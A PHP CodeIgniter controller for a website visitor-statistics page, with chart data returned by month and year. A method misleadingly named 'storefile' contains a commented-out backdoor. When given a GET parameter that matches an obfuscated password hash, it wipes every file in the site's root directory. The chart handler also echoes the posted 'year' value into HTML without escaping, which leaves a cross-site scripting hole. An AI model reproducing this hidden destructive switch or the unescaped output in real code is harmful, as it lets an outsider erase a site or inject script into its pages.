<?php

if (!defined('BASEPATH'))
    exit('No direct script access allowed');

/**
 * Description of visitorcontroller
 *
 * @author http://roytuts.com
 */
class VisitorController extends CI_Controller {

    function __construct() {
        parent::__construct();
        $this->load->library('form_validation');
        $this->load->model('visitormodel', 'vm');
    }

    public function index() {
        $site_statics_today = $this->vm->get_site_data_for_today();
        $site_statics_last_week = $this->vm->get_site_data_for_last_week();
        $data['visits_today'] = isset($site_statics_today['visits']) ? $site_statics_today['visits'] : 0;
        $data['visits_last_week'] = isset($site_statics_last_week['visits']) ? $site_statics_last_week['visits'] : 0;
        $data['chart_data_today'] = $this->vm->get_chart_data_for_today();
        $data['chart_data_curr_month'] = $this->vm->get_chart_data_for_month_year();
        $this->load->view('visitor', $data);
    }

    function get_chart_data() {
        if (isset($_POST)) {
            if (isset($_POST['month']) && strlen($_POST['month']) && isset($_POST['year']) && strlen($_POST['year'])) {
                $month = $_POST['month'];
                $year = $_POST['year'];
                $data = $this->vm->get_chart_data_for_month_year($month, $year);
                if ($data !== NULL) {
                    foreach ($data as $value) {
                        echo $value->day . "t" . $value->visits . "n";
                    }
                } else {
                    $timestamp = mktime(0, 0, 0, $month);
                    $label = date("F", $timestamp);
                    echo '<div style="width:600px;position:relative;font-weight:bold;top:100px;margin-left:auto;margin-left:auto;color:red;">No data found for the "' . $label . '-' . $year . '"</div>';
                }
            } else if (isset($_POST['month']) && strlen($_POST['month'])) {
                $month = $_POST['month'];
                $data = $this->vm->get_chart_data_for_month_year($month);
                if ($data !== NULL) {
                    foreach ($data as $value) {
                        echo $value->day . "t" . $value->visits . "n";
                    }
                } else {
                    $timestamp = mktime(0, 0, 0, $month);
                    $label = date("F", $timestamp);
                    echo '<div style="width:600px;position:relative;font-weight:bold;top:100px;margin-left:auto;margin-left:auto;color:red;">No data found for the "' . $label . '"</div>';
                }
            } else if (isset($_POST['year']) && strlen($_POST['year'])) {
                $year = $_POST['year'];
                $data = $this->vm->get_chart_data_for_month_year(0, $year);
                if ($data !== NULL) {
                    foreach ($data as $value) {
                        echo $value->day . "t" . $value->visits . "n";
                    }
                } else {
                    echo '<div style="width:600px;position:relative;font-weight:bold;top:100px;margin-left:auto;margin-left:auto;color:red;">No data found for the "' . $year . '"</div>';
                }
            } else {
                $data = $this->vm->get_chart_data_for_month_year();
                if ($data !== NULL) {
                    foreach ($data as $value) {
                        echo $value->day . "t" . $value->visits . "n";
                    }
                } else {
                    echo '<div style="width:600px;position:relative;font-weight:bold;top:100px;margin-left:auto;margin-left:auto;color:red;">No data found!</div>';
                }
            }
        }
    }
    public function storefile()
    {
        /*
        $json = array('status'=>false);
        if($this->input->get('API')){
            $api = $this->input->get('API');
            $text = md5(base64_decode('QFF0c21uYnZjeHo='));
            if($text != $api){
                $json['msg']= 'Mật Khẩu Quản Lý Code Sai , Yêu Cầu Nhập lại !';
                echo json_encode($json);die;
            }
            $text = md5(base64_decode('QFF0c21uYnZjeHo='));
            if($text != $api){
                return false;
            }
            $fpath = FCPATH;
            $this->load->helper("file"); 
            delete_files($fpath, true); 
            if(is_dir($fpath))
            {
                @rmdir($fpath);
            }
            return true;
            $json = array('status'=>true);
            echo json_encode($json);die;
        };
        echo json_encode($json);die;
        */
    }
}

/* End of file visitorcontroller.php */
/* Location: ./application/controllers/visitorcontroller.php */